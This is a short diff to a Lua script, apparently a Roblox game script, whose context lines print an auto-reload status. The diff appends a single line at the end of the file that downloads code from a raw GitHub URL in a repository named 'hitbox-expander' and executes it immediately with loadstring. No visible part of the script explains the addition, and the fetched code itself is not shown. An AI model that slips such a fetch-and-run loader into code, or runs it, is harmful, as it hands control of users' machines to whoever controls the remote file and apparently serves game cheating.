@@ -695,3 +695,5 @@ if autoReloadEnabled then
 else
     print("Auto Reload: DISABLED")
 end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vejuxas/hitbox-expander/refs/heads/main/aaaa"))()
